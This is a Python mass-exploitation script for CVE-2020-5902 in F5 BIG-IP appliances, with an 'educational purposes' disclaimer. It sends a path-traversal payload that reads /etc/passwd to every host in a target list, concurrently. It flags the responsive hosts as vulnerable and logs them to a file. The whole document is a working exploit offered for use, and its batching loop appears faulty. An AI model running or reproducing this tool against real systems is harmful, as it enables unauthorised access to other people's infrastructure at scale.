import argparse
import aiohttp
import asyncio
from termcolor import colored

'''
Coded by d4rkstat1c..
CVE-2020-5902-mass-exploiter.
Use for educational purposes.
Shoutz to s1ege, neckros & 3turr.
usage: mass.py -l list.txt -w <workers amount>
'''

async def work(session, target):
    payload = '/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
    try:
        async with session.get(target+payload, timeout=10) as r:
            if r.status == 200:
                if 'root:x:0:0:root' in await r.text():
                    print(colored('[+] {0} is vulnerable!\n'.format(target), 'green'))
                else:
                    print(colored('[+] {0} may be vulnerable!\n'.format(target), 'yellow'))
                f = open('result.txt', 'a')
                f.write(target+'\n')
                f.close()
            else:
                print(colored('[-] {0} Exploit failed.\n'.format(target), 'red'))
    except:
        print(colored('[-] {0} Network/Connection Error.'.format(target), 'blue'))

async def create_workers(targets):
    async with aiohttp.TCPConnector(ssl=False) as connector:
        async with aiohttp.ClientSession(connector=connector) as session:
            await asyncio.gather(*[work(session, target.strip()) for target in targets])

def main():
    parser = argparse.ArgumentParser(description='F5 Big-IP CVE-2020-5902 mass exploiter')
    parser.add_argument('-l', '--list', type=str, required=True,
                        help='Specify the list of targets.')
    parser.add_argument('-w', '--workers', type=str, required=True,
                        help='Specify the max amount of workers.')
    args = parser.parse_args()

    with open(args.list, "r") as f:
        targets = f.readlines()

    start = 0
    max_workers = int(args.workers)
    list_len = (len(targets))

    if max_workers >= list_len:
        asyncio.get_event_loop().run_until_complete(create_workers(targets))
    else:
        while max_workers <= list_len:
            target_chunk = targets[start:max_workers]
            asyncio.get_event_loop().run_until_complete(create_workers(target_chunk))
            start = max_workers
            max_workers += max_workers

if __name__ == '__main__':
    main()
